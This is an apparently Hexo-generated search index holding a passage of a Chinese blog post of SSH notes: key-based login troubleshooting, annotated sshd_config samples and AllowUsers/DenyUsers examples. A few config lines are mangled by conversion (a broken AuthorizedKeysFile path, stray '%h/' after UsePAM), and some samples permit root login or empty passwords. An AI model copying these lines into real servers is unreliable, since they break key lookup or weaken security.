<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SSH问题经验</title>
      <link href="/posts/187821551/"/>
      <url>/posts/187821551/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH-问题经验"><a href="#SSH-问题经验" class="headerlink" title="SSH 问题经验"></a>SSH 问题经验</h1><h2 id="Permission-denied-publickey-gssapi-keyex-gssapi-with-mic"><a href="#Permission-denied-publickey-gssapi-keyex-gssapi-with-mic" class="headerlink" title="Permission denied (publickey,gssapi-keyex,gssapi-with-mic)"></a>Permission denied (publickey,gssapi-keyex,gssapi-with-mic)</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>ssh 客户端 macbook 上通过<code>ssh-keygen -t rsa</code>生成公钥<code>id_rsa.pub</code>和私钥<code>id_rsa</code></p><p>用键盘复制粘贴到 ssh 服务端的<code>~/.ssh/authorized_keys</code></p><p>然后在客户端上发起连接：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i \~/.ssh/id\_rsa heng@服务端IP</span><br></pre></td></tr></tbody></table></figure><p>报错：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heng@120.55.54.47: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).</span><br></pre></td></tr></tbody></table></figure><h3 id="lost-connection"><a href="#lost-connection" class="headerlink" title="lost connection"></a>lost connection</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/187821551/226280-20211201233704194.png" alt="img"></p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>提示是公钥报错，<strong>直接复制粘贴有问题</strong>，复制粘贴的效果如下：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/187821551/226296-20211201233704227.png" alt="img"></p><p>需要把客户端的公钥文件 scp 到远程的 ssh 服务端上，这里的 - i 是老私钥：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -i \~/.ssh/id\_rsa\_centos \~/.ssh/id\_rsa.pub heng@120.55.54.47:\~/.ssh</span><br></pre></td></tr></tbody></table></figure><p>也可以在服务端打开密码登录，就不用指定私钥了：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp \~/.ssh/id\_rsa.pub heng@120.55.54.47:\~/.ssh</span><br></pre></td></tr></tbody></table></figure><p>之后在服务端上再做累加：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat id\_rsa.pub &gt;&gt; authorized\_keys</span><br></pre></td></tr></tbody></table></figure><p><strong>cat 累加到 authorized_keys</strong>的效果如下：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/187821551/226299-20211201233704229.png" alt="img"></p><h3 id="权限保证"><a href="#权限保证" class="headerlink" title="权限保证"></a>权限保证</h3><ul><li><p>  客户端公钥文件<strong>id_rsa.pub：644</strong></p></li><li><p>  客户端私钥文件<strong>id_rsa：600</strong></p></li><li><p>  服务端存放公钥的文件<strong>authorized_keys</strong>：<strong>600</strong></p></li></ul><h1 id="SSH-配置项"><a href="#SSH-配置项" class="headerlink" title="SSH 配置项"></a>SSH 配置项</h1><p>主配置文件：<code>/etc/ssh/sshd_config</code></p><p>帮助信息：<code>man sshd_config</code></p><h2 id="示例一、网管部配置文件（新用户需要创建密码，无密码无法登陆）"><a href="#示例一、网管部配置文件（新用户需要创建密码，无密码无法登陆）" class="headerlink" title="示例一、网管部配置文件（新用户需要创建密码，无密码无法登陆）"></a>示例一、网管部配置文件（新用户需要创建密码，无密码无法登陆）</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Port 32200</span><br><span class="line"></span><br><span class="line">Protocol 2</span><br><span class="line"></span><br><span class="line">PermitRootLogin no</span><br><span class="line"></span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line">AuthorizedKeysFile .ssh/authorized\_keys</span><br><span class="line"></span><br><span class="line">PasswordAuthentication no</span><br><span class="line"></span><br><span class="line">PermitEmptyPasswords yes</span><br><span class="line"></span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line">UsePAM no</span><br><span class="line"></span><br><span class="line">UseDNS no</span><br><span class="line"></span><br><span class="line">Subsystem sftp /usr/lib/openssh/sftp-server</span><br></pre></td></tr></tbody></table></figure><h2 id="示例二、常规配置"><a href="#示例二、常规配置" class="headerlink" title="示例二、常规配置"></a>示例二、常规配置</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">Port 22</span><br><span class="line"></span><br><span class="line">Port 8210</span><br><span class="line"></span><br><span class="line">\# Use these options to restrict which interfaces/protocols sshd will bind to</span><br><span class="line"></span><br><span class="line">\#ListenAddress ::</span><br><span class="line"></span><br><span class="line">\#ListenAddress 0.0.0.0</span><br><span class="line"></span><br><span class="line">Protocol 2</span><br><span class="line"></span><br><span class="line">\# HostKeys for protocol version 2</span><br><span class="line"></span><br><span class="line">HostKey /etc/ssh/ssh\_host\_rsa\_key</span><br><span class="line"></span><br><span class="line">HostKey /etc/ssh/ssh\_host\_dsa\_key</span><br><span class="line"></span><br><span class="line">HostKey /etc/ssh/ssh\_host\_ecdsa\_key</span><br><span class="line"></span><br><span class="line">HostKey /etc/ssh/ssh\_host\_ed25519\_key</span><br><span class="line"></span><br><span class="line">\#Privilege Separation is turned on for security</span><br><span class="line"></span><br><span class="line">UsePrivilegeSeparation yes</span><br><span class="line"></span><br><span class="line">\# Lifetime and size of ephemeral version 1 server key</span><br><span class="line"></span><br><span class="line">KeyRegenerationInterval 3600</span><br><span class="line"></span><br><span class="line">ServerKeyBits 1024</span><br><span class="line"></span><br><span class="line">\# Logging</span><br><span class="line"></span><br><span class="line">SyslogFacility AUTH</span><br><span class="line"></span><br><span class="line">LogLevel INFO</span><br><span class="line"></span><br><span class="line">\# Authentication:</span><br><span class="line"></span><br><span class="line">LoginGraceTime 120</span><br><span class="line"></span><br><span class="line">PermitRootLogin yes</span><br><span class="line"></span><br><span class="line">StrictModes yes</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line"></span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line">AuthorizedKeysFile  h/.ssh/authorized\_keys</span><br><span class="line"></span><br><span class="line">\# Don't read the user's \~/.rhosts and \~/.shosts files</span><br><span class="line"></span><br><span class="line">IgnoreRhosts yes</span><br><span class="line"></span><br><span class="line">\# For this to work you will also need host keys in /etc/ssh\_known\_hosts</span><br><span class="line"></span><br><span class="line">RhostsRSAAuthentication no</span><br><span class="line"></span><br><span class="line">\# similar for protocol version 2</span><br><span class="line"></span><br><span class="line">HostbasedAuthentication no</span><br><span class="line"></span><br><span class="line">\# Uncomment if you don't trust \~/.ssh/known\_hosts for RhostsRSAAuthentication</span><br><span class="line"></span><br><span class="line">\#IgnoreUserKnownHosts yes</span><br><span class="line"></span><br><span class="line">\# To enable empty passwords, change to yes (NOT RECOMMENDED)</span><br><span class="line"></span><br><span class="line">PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line">\# Change to yes to enable challenge-response passwords (beware issues with</span><br><span class="line"></span><br><span class="line">\# some PAM modules and threads)</span><br><span class="line"></span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line">\# Change to no to disable tunnelled clear text passwords</span><br><span class="line"></span><br><span class="line">PasswordAuthentication no</span><br><span class="line"></span><br><span class="line">\# Kerberos options</span><br><span class="line"></span><br><span class="line">\#KerberosAuthentication no</span><br><span class="line"></span><br><span class="line">\#KerberosGetAFSToken no</span><br><span class="line"></span><br><span class="line">\#KerberosOrLocalPasswd yes</span><br><span class="line"></span><br><span class="line">\#KerberosTicketCleanup yes</span><br><span class="line"></span><br><span class="line">\# GSSAPI options</span><br><span class="line"></span><br><span class="line">\#GSSAPIAuthentication no</span><br><span class="line"></span><br><span class="line">\#GSSAPICleanupCredentials yes</span><br><span class="line"></span><br><span class="line">X11Forwarding yes</span><br><span class="line"></span><br><span class="line">X11DisplayOffset 10</span><br><span class="line"></span><br><span class="line">PrintMotd no</span><br><span class="line"></span><br><span class="line">PrintLastLog yes</span><br><span class="line"></span><br><span class="line">TCPKeepAlive yes</span><br><span class="line"></span><br><span class="line">\#UseLogin no</span><br><span class="line"></span><br><span class="line">\#MaxStartups 10:30:60</span><br><span class="line"></span><br><span class="line">\#Banner /etc/issue.net</span><br><span class="line"></span><br><span class="line">\# Allow client to pass locale environment variables</span><br><span class="line"></span><br><span class="line">AcceptEnv LANG LC\_\*</span><br><span class="line"></span><br><span class="line">Subsystem sftp /usr/lib/openssh/sftp-server</span><br><span class="line"></span><br><span class="line">\# Set this to 'yes' to enable PAM authentication, account processing,</span><br><span class="line"></span><br><span class="line">\# and session processing. If this is enabled, PAM authentication will</span><br><span class="line"></span><br><span class="line">\# be allowed through the ChallengeResponseAuthentication and</span><br><span class="line"></span><br><span class="line">\# PasswordAuthentication. Depending on your PAM configuration,</span><br><span class="line"></span><br><span class="line">\# PAM authentication via ChallengeResponseAuthentication may bypass</span><br><span class="line"></span><br><span class="line">\# the setting of "PermitRootLogin without-password".</span><br><span class="line"></span><br><span class="line">\# If you just want the PAM account and session checks to run without</span><br><span class="line"></span><br><span class="line">\# PAM authentication, then enable this but set PasswordAuthentication</span><br><span class="line"></span><br><span class="line">\# and ChallengeResponseAuthentication to 'no'.</span><br><span class="line"></span><br><span class="line">UsePAM yes      %</span><br></pre></td></tr></tbody></table></figure><h2 id="配置项意义"><a href="#配置项意义" class="headerlink" title="配置项意义"></a>配置项意义</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line">\# 服务端默认的监听端口，可\*\*逐列写多个\*\*</span><br><span class="line"></span><br><span class="line">\# 默认22</span><br><span class="line"></span><br><span class="line">Port 22</span><br><span class="line"></span><br><span class="line">Port 8210</span><br><span class="line"></span><br><span class="line">\# 指定</span><br><span class="line"></span><br><span class="line">\#ListenAddress ::</span><br><span class="line"></span><br><span class="line">\#ListenAddress 0.0.0.0</span><br><span class="line"></span><br><span class="line">Protocol 2</span><br><span class="line"></span><br><span class="line">\# 服务端本机的key所在位置</span><br><span class="line"></span><br><span class="line">HostKey /etc/ssh/ssh\_host\_rsa\_key</span><br><span class="line"></span><br><span class="line">HostKey /etc/ssh/ssh\_host\_dsa\_key</span><br><span class="line"></span><br><span class="line">HostKey /etc/ssh/ssh\_host\_ecdsa\_key</span><br><span class="line"></span><br><span class="line">HostKey /etc/ssh/ssh\_host\_ed25519\_key</span><br><span class="line"></span><br><span class="line">\#Privilege Separation is turned on for security</span><br><span class="line"></span><br><span class="line">UsePrivilegeSeparation yes</span><br><span class="line"></span><br><span class="line">\# Lifetime and size of ephemeral version 1 server key</span><br><span class="line"></span><br><span class="line">KeyRegenerationInterval 3600</span><br><span class="line"></span><br><span class="line">ServerKeyBits 1024</span><br><span class="line"></span><br><span class="line">\# Logging</span><br><span class="line"></span><br><span class="line">SyslogFacility AUTH</span><br><span class="line"></span><br><span class="line">LogLevel INFO</span><br><span class="line"></span><br><span class="line">\# Authentication:</span><br><span class="line"></span><br><span class="line">LoginGraceTime 120</span><br><span class="line"></span><br><span class="line">\# 是否允许用户名为Root的进行远程登录</span><br><span class="line"></span><br><span class="line">\# 可选项为：yes、no、without-password</span><br><span class="line"></span><br><span class="line">\# 建议no</span><br><span class="line"></span><br><span class="line">PermitRootLogin yes</span><br><span class="line"></span><br><span class="line">StrictModes yes</span><br><span class="line"></span><br><span class="line">\# 启用RSA加密认证</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line"></span><br><span class="line">\# 启用公钥认证</span><br><span class="line"></span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line">\# 指定存放本地用户公钥的文件</span><br><span class="line"></span><br><span class="line">\# 默认 \*\*%h/.ssh/authorized\_keys\*\*</span><br><span class="line"></span><br><span class="line">AuthorizedKeysFile    .ssh/authorized\_keys</span><br><span class="line"></span><br><span class="line">\# 忽略用户文件： \~/.rhosts and \~/.shosts files</span><br><span class="line"></span><br><span class="line">IgnoreRhosts yes</span><br><span class="line"></span><br><span class="line">\# For this to work you will also need host keys in /etc/ssh\_known\_hosts</span><br><span class="line"></span><br><span class="line">RhostsRSAAuthentication no</span><br><span class="line"></span><br><span class="line">\# similar for protocol version 2</span><br><span class="line"></span><br><span class="line">HostbasedAuthentication no</span><br><span class="line"></span><br><span class="line">\# Uncomment if you don't trust \~/.ssh/known\_hosts for RhostsRSAAuthentication</span><br><span class="line"></span><br><span class="line">\#IgnoreUserKnownHosts yes</span><br><span class="line"></span><br><span class="line">\# 在\*\*PasswordAuthentication no\*\*的前提下，允许空密码</span><br><span class="line"></span><br><span class="line">\# 默认no，建议no</span><br><span class="line"></span><br><span class="line">PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line">\# 在\*\*PasswordAuthentication no\*\*的前提下，提示用户输入密码</span><br><span class="line"></span><br><span class="line">\# 默认no，建议no</span><br><span class="line"></span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line">\# 通过密码做SSH认证</span><br><span class="line"></span><br><span class="line">\# 默认no</span><br><span class="line"></span><br><span class="line">PasswordAuthentication no</span><br><span class="line"></span><br><span class="line">\# Kerberos认证相关选项</span><br><span class="line"></span><br><span class="line">\# 默认注释</span><br><span class="line"></span><br><span class="line">\#KerberosAuthentication no</span><br><span class="line"></span><br><span class="line">\#KerberosGetAFSToken no</span><br><span class="line"></span><br><span class="line">\#KerberosOrLocalPasswd yes</span><br><span class="line"></span><br><span class="line">\#KerberosTicketCleanup yes</span><br><span class="line"></span><br><span class="line">\# GSSAPI认证相关选项</span><br><span class="line"></span><br><span class="line">\# 默认注释</span><br><span class="line"></span><br><span class="line">\#GSSAPIAuthentication no</span><br><span class="line"></span><br><span class="line">\#GSSAPICleanupCredentials yes</span><br><span class="line"></span><br><span class="line">X11Forwarding yes</span><br><span class="line"></span><br><span class="line">X11DisplayOffset 10</span><br><span class="line"></span><br><span class="line">PrintMotd no</span><br><span class="line"></span><br><span class="line">PrintLastLog yes</span><br><span class="line"></span><br><span class="line">TCPKeepAlive yes</span><br><span class="line"></span><br><span class="line">\# 允许ssh的client端变更语言环境变量</span><br><span class="line"></span><br><span class="line">\# 默认 AcceptEnv LANG LC\_\*</span><br><span class="line"></span><br><span class="line">AcceptEnv LANG LC\_\*</span><br><span class="line"></span><br><span class="line">\# 指定sftp命令所在的文件位置，可通过 \*\*find / -name sftp-server\*\*做二次确认</span><br><span class="line"></span><br><span class="line">\# \*\*Debian\*\*默认 Subsystem sftp /usr/lib/openssh/sftp-server</span><br><span class="line"></span><br><span class="line">\# \*\*Centos\*\*默认 Subsystem sftp /usr/libexec/openssh/sftp-server</span><br><span class="line"></span><br><span class="line">Subsystem sftp /usr/lib/openssh/sftp-server</span><br><span class="line"></span><br><span class="line">\# Set this to 'yes' to enable PAM authentication, account processing,</span><br><span class="line"></span><br><span class="line">\# and session processing. If this is enabled, PAM authentication will</span><br><span class="line"></span><br><span class="line">\# be allowed through the ChallengeResponseAuthentication and</span><br><span class="line"></span><br><span class="line">\# PasswordAuthentication. Depending on your PAM configuration,</span><br><span class="line"></span><br><span class="line">\# PAM authentication via ChallengeResponseAuthentication may bypass</span><br><span class="line"></span><br><span class="line">\# the setting of "PermitRootLogin without-password".</span><br><span class="line"></span><br><span class="line">\# If you just want the PAM account and session checks to run without</span><br><span class="line"></span><br><span class="line">\# PAM authentication, then enable this but set PasswordAuthentication</span><br><span class="line"></span><br><span class="line">\# and ChallengeResponseAuthentication to 'no'.</span><br><span class="line"></span><br><span class="line">\# 启用PAM认证选项，相关配置文件位于\*\*/etc/pam.conf\*\*、\*\*/etc/pam.d/\*\*\*</span><br><span class="line"></span><br><span class="line">\# 启用后，密码提示（\*\*ChallengeResponseAuthentication\*\*）、使用密码认证（\*\*PasswordAuthentication\*\*）将被允许使用，具体依赖于PAM的配置</span><br><span class="line"></span><br><span class="line">UsePAM yes    %h/</span><br></pre></td></tr></tbody></table></figure><h1 id="SSH-使用经验"><a href="#SSH-使用经验" class="headerlink" title="SSH 使用经验"></a>SSH 使用经验</h1><h2 id="SSH-工具"><a href="#SSH-工具" class="headerlink" title="SSH 工具"></a>SSH 工具</h2><ul><li><p>  <strong>ssh-keygen</strong>：本地生成公私钥对</p></li><li><p>  <strong>ssh-copy-id</strong>：把本机公钥拷贝到远程机器上去</p></li></ul><h2 id="SSH-限制指定用户从指定地址远程登录-SSH-根据用户名限制登录"><a href="#SSH-限制指定用户从指定地址远程登录-SSH-根据用户名限制登录" class="headerlink" title="SSH 限制指定用户从指定地址远程登录 / SSH 根据用户名限制登录"></a>SSH 限制指定用户从指定地址远程登录 / SSH 根据用户名限制登录</h2><p>在<code>/etc/ssh/sshd_config</code>中使用关键字：<code>AllowUsers、AllowGroups、DenyUsers、DenyGroups</code></p><p>默认允许所有用户、组从任意地址登录，<strong>参考资料：</strong><code>man sshd_config</code></p><p>其中：</p><ul><li><p>  <strong>Deny</strong>是仅拒绝指定的条件，<strong>放行其他</strong></p></li><li><p>  <strong>Allow</strong>是放行指定的条件，<strong>拒绝其他</strong></p></li><li><p>  <strong>Allow 比 Deny 更严格规范。</strong></p></li></ul><p>当使用限制以后，若登录失败，<strong>报错提示</strong>：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/187821551/D76FE865-B8DA-460B-8465-AC0B6C29C0BF.jpeg" alt="img"></p><h3 id="例-1：只允许-admin-可以在任何地方登录，不允许其他用户登录"><a href="#例-1：只允许-admin-可以在任何地方登录，不允许其他用户登录" class="headerlink" title="例 1：只允许 admin 可以在任何地方登录，不允许其他用户登录"></a>例 1：只允许 admin 可以在任何地方登录，不允许其他用户登录</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowUsers admin</span><br></pre></td></tr></tbody></table></figure><h3 id="例-2：只允许-admin-从-192-168-130-21-23-登录，禁止其他用户登录"><a href="#例-2：只允许-admin-从-192-168-130-21-23-登录，禁止其他用户登录" class="headerlink" title="例 2：只允许 admin 从 192.168.130.21 / 23 登录，禁止其他用户登录"></a>例 2：只允许 admin 从 192.168.130.21 / 23 登录，禁止其他用户登录</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowUsers admin@192.168.130.23 admin@192.168.130.21</span><br></pre></td></tr></tbody></table></figure><h3 id="例-3：只允许-root-从-192-168-130-23-登录，允许-admin-从任意地点登录，禁止其他用户、地址登录"><a href="#例-3：只允许-root-从-192-168-130-23-登录，允许-admin-从任意地点登录，禁止其他用户、地址登录" class="headerlink" title="例 3：只允许 root 从 192.168.130.23 登录，允许 admin 从任意地点登录，禁止其他用户、地址登录"></a>例 3：只允许 root 从 192.168.130.23 登录，允许 admin 从任意地点登录，禁止其他用户、地址登录</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowUsers root@192.168.130.23 admin</span><br></pre></td></tr></tbody></table></figure><h3 id="例-4：仅不允许-root-从-192-168-130-23-登录，但是允许-root-从其他地址登录，也允许其他用户从任意地址登录"><a href="#例-4：仅不允许-root-从-192-168-130-23-登录，但是允许-root-从其他地址登录，也允许其他用户从任意地址登录" class="headerlink" title="例 4：仅不允许 root 从 192.168.130.23 登录，但是允许 root 从其他地址登录，也允许其他用户从任意地址登录"></a>例 4：仅不允许 root 从 192.168.130.23 登录，但是允许 root 从其他地址登录，也允许其他用户从任意地址登录</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DenyUsers root@192.168.130.23</span><br></pre></td></tr></tbody></table></figure><h2 id="sshd-config-属性"><a href="#sshd-config-属性" class="headerlink" title="sshd_config 属性"></a>sshd_config 属性</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\# 本地用户名\*\*必须要有密码\*\*才行，useradd加的用户名不包含密码，必须手动创建</span><br><span class="line"></span><br><span class="line">PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line">\# 允许Root登录</span><br><span class="line"></span><br><span class="line">PermitRootLogin yes</span><br></pre></td></tr></tbody></table></figure><h2 id="仅允许密钥登录"><a href="#仅允许密钥登录" class="headerlink" title="仅允许密钥登录"></a>仅允许密钥登录</h2><p>重启服务：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></tbody></table></figure><p>配置 openssh（鸟哥服务器篇_P.313~337）</p><p>连接命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 8210 -X heng@10.240.0.1  ##heng为在10.240.0.1上的user</span><br></pre></td></tr></tbody></table></figure><ul><li><p>  <strong>-p</strong>：表示服务端开放的端口；</p></li><li><p>  <strong>-X</strong>：表示提供图形化接口；</p></li></ul><h2 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h2><p><strong>私钥永不离身</strong>，只做签名</p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>两台 PC，一台客户机 desktop，一台服务器 server，采用非对称加密方式：</p><ol><li><p> 